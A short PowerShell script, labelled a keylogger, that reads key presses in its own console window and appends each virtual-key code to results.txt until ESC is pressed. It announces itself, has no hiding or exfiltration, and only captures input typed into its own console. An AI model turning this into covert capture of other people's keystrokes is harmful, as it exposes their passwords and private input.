# Create file 
$logFile = "results.txt"

if (!(Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File -Force | Out-Null
}

Write-Host "Keylogger started. Press ESC to stop."

while ($true) {
    #reads the key that is pressed
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode
    #end the process
    if ($key -eq 27) { break }
    #add each key press to $logfile
    Add-Content -Path $logFile -Value "$key"
}
